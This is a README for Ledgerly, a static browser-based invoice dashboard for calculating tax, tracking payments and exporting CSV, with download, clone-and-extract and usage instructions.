# Ledgerly — Invoice Finance Dashboard

<p align="center">
  <strong>Turn invoice uploads into a clear view of your finances.</strong>
  <br />
  Calculate tax, track payment status, and review cash flow from one browser-based dashboard.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Static%20web%20app-no%20build-0f9f86?style=for-the-badge" alt="Static web app, no build required" />
  <img src="https://img.shields.io/badge/Storage-browser%20local-516273?style=for-the-badge" alt="Browser local storage" />
</p>

## Live preview`r`n`r`n[Open Ledgerly](https://251030285-creator.github.io/ledgerly-finance-dashboard/)`r`n`r`n## Highlights

- Add invoices manually or upload invoice files for data extraction.
- Calculate invoice subtotals and line-item tax.
- Track billed, paid, outstanding, and overdue amounts.
- Review monthly cash flow and vendor summaries.
- Export invoice records to CSV.
- Keep invoice records in the current browser using local storage.

## Get started

### Download the app

1. [Download the latest dashboard ZIP](https://github.com/251030285-creator/ledgerly-finance-dashboard/raw/refs/heads/main/ledgerly-finance-dashboard.zip).
2. Extract the downloaded ZIP.
3. Open the extracted `ledgerly-finance-dashboard` folder.
4. Open `index.html` in a current version of Chrome, Edge, Firefox, or Safari.

No build step, package manager, or local server is required.

### Run from a repository clone

```bash
git clone https://github.com/251030285-creator/ledgerly-finance-dashboard.git
cd ledgerly-finance-dashboard
```

Extract the app package included in the repository:

**Windows PowerShell**

```powershell
Expand-Archive .\ledgerly-finance-dashboard.zip -DestinationPath .\dashboard
```

**macOS / Linux**

```bash
unzip ledgerly-finance-dashboard.zip -d dashboard
```

Then open `dashboard/ledgerly-finance-dashboard/index.html` in your browser. If the extracted folder has a different name, open the `index.html` inside that folder.

## Use the dashboard

1. Choose **Add invoice** and upload a bill or enter invoice details manually.
2. Review the extracted details, then save the invoice.
3. Use the dashboard cards and navigation to review totals, tax, payments, history, and cash flow.
4. Choose **Export** to download a CSV backup of your invoice list.

## Requirements

- A modern desktop or mobile browser
- Internet access for PDF text extraction and image OCR, which load PDF.js and Tesseract.js from public CDNs
- CSV/text uploads and manual entry work without those OCR libraries

## Data and calculation notes

- Invoice records are saved in the browser's local storage on the device where they were entered. They do not automatically sync across browsers or devices.
- Review extracted invoice information before saving.
- Currency selection changes how amounts are displayed; it does not convert values between currencies.
- Use CSV export to keep a separate backup of your records.

## Project files

The repository provides the dashboard as a ZIP package. Inside the extracted package:

| File | Purpose |
| --- | --- |
| `index.html` | Dashboard structure and navigation |
| `styles.css` | Layout, responsive styling, and animated background |
| `app.js` | Invoice processing, calculations, charts, local persistence, and CSV export |

---

<p align="center"><sub>Ledgerly · Invoice insights, made clear.</sub></p>



